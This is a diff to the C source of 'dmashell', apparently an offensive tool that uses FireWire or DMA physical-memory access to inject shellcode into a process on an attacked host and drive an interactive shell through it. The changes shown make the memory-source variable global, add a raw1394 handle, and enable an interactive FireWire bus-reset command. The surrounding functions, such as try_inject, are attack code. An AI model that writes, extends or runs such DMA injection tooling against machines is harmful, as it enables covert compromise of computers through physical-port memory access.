@@ -47,6 +47,8 @@ enum memsource {
 	SOURCE_IEEE1394
 };
 
+enum memsource memsource = SOURCE_UNDEFINED;
+
 char pagedir[4096];
 
 #define NODE_OFFSET     0xffc0
@@ -224,6 +226,9 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 }}}
 
 volatile int do_terminate = 0;
+volatile int do_reset = 0;
+
+raw1394handle_t rawhandle = NULL;
 
 // set STDIN to blocking mode
 void set_blocking_stdin()
@@ -255,9 +260,8 @@ void handle_sigint(int __attribute__ ((__unused__)) signal)
 	       TERM_YELLOW "(dmashell)" TERM_RESET " press enter to just continue\n"
 	       TERM_YELLOW "(dmashell)" TERM_RESET " press k to tell shellcode to send a SIGKILL to the shell\n"
 	       TERM_YELLOW "(dmashell)" TERM_RESET " press q to terminate dmashell NOW (same as CTRL-\\)\n"
-/*	       TERM_YELLOW "(dmashell)" TERM_RESET " press s to rescan memory for the processes pagedirectory\n"
-	       TERM_YELLOW "(dmashell)" TERM_RESET " press f to rescan the firewire-bus for the attacked host\n"
-	       TERM_YELLOW "(dmashell)" TERM_RESET " press r to initiate a firewire-bus-reset\n"  */
+//	       TERM_YELLOW "(dmashell)" TERM_RESET " press s to rescan memory for the processes pagedirectory\n"
+	       TERM_YELLOW "(dmashell)" TERM_RESET " press r to initiate a firewire-bus-reset (if you are using firewire)\n"
 	      );
 
 	switch (getchar()) {
@@ -275,15 +279,15 @@ void handle_sigint(int __attribute__ ((__unused__)) signal)
 		case 'S':
 			// rescan for to-be-attacked process?
 			break;
-		case 'f':
-		case 'F':
-			// rescan raw1394 bus for attack-target
-			break;
+*/
 		case 'r':
 		case 'R':
 			// initiate firewire-bus-reset
+			if(memsource == SOURCE_IEEE1394)
+				do_reset = 1;
+			else
+				printf(TERM_YELLOW "(dmashell)" TERM_RESET " sorry, you are not using firewire. skipping.\n");
 			break;
-*/
 		default:
 			printf(TERM_YELLOW "(dmashell)" TERM_RESET " unknown command. skipping back to interactive shellcode\n");
 			break;
@@ -386,14 +390,26 @@ void use_shell(linear_handle lin, uint32_t base)
 			printf(TERM_YELLOW "(dmashell)" TERM_RESET " SIGKILL relayed.\n");
 		}
 
+		if(do_reset) {
+			// do_reset is only set if we are using firewire. this test is
+			// done in signal handler.
+			do_reset = 0;
+			raw1394_reset_bus_new(rawhandle, RAW1394_LONG_RESET);
+
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " sent a ieee1394 busreset.\n");
+			sleep(2);
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " done.\n");
+		}
+
 		if(!rfrm_active && !rto_active)
 			usleep(50000);
 
 		if(!child_is_dead)
 			GET_child_is_dead;
 	}
-	// FIXME: we should only do this, if the process exists. we need to test this!
-	ACK_child_is_dead;
+	// only send an ACK if the mark is still ok
+	if(mark_value == MARK_CHANGED)
+		ACK_child_is_dead;
 
 	set_blocking_stdin();
 }}}
@@ -432,7 +448,6 @@ int main(int argc, char**argv)
 
 	uint32_t base = 0;
 
-	enum memsource memsource = SOURCE_UNDEFINED;
 	char *filename = NULL;
 	int nodeid = 0;
 
@@ -487,7 +502,8 @@ int main(int argc, char**argv)
 		{ printf("physical handle is null\n"); return -2; }
 	if( memsource == SOURCE_IEEE1394 ) {
 		// create raw1394handle
-		phy_data.ieee1394.raw1394handle = raw1394_new_handle();
+		rawhandle = raw1394_new_handle();
+		phy_data.ieee1394.raw1394handle = rawhandle;
 		if(!phy_data.ieee1394.raw1394handle)
 			{ printf("failed to open raw1394\n"); return -3; }
 		// associate raw1394 to port
